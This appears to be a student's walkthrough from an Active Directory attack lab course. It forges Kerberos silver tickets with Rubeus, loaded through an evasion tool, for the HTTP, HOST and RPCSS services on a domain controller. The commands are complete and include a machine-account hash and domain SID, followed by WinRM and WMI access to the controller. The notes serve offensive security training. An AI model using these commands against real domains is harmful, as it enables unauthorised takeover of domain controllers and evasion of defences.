# Learning Objetive 9

* Try to get command execution on the domain controller by creating silver ticket for:
  * HTTP
  * WMI

***

From the information gathered in the previous steps we have;

* The hash for the machine account of the domain controller (dcorp-dc$).

> Note that we are NOT using the krbtgt hash here. Using the below command, we can create a Silver Ticket that provides us access to the HTTP service (WinRM) on DC.
>
> Please note that the hash of `dcorp-dc$` (RC4 in the below command) may be different in your lab instance.

HTTP Service

You can also use aes256 keys in place of NTLM hash:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../../../.gitbook/assets/image (1433).png" alt=""><figcaption></figcaption></figure>

### Verify it

We can check if we got the correct service ticket:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

<figure><img src="../../../.gitbook/assets/image (1434).png" alt=""><figcaption></figcaption></figure>

We have the HTTP service ticket for `dcorp-dc`, let’s try accessing it using `winrs`. Note that we are using FQDN of `dcorp-dc` as that is what the service ticket has:

<figure><img src="../../../.gitbook/assets/image (1436).png" alt=""><figcaption></figcaption></figure>

## WMI Service

For accessing WMI, we need to create two tickets - one for **HOST** service and another for **RPCSS**. Run the below commands from an elevated shell:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

> * `/service:host/...` → le dice a Kerberos que este ticket es para el servicio HOST en el DC.
> * `/ptt` → inyecta el ticket directamente en tu sesión actual (no lo guarda en disco).
> * `/ldap` → Rubeus consulta el DC y completa SID, groups, etc. automáticamente.

Now, in the same windows we pushed him to Inject a ticket for **RPCSS**:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

### Verify it

Check if the tickets are present.

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

<figure><img src="../../../.gitbook/assets/image (1435).png" alt=""><figcaption></figcaption></figure>

Now, try running WMI commands on the domain controller:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../../../.gitbook/assets/image (1437).png" alt=""><figcaption></figcaption></figure>
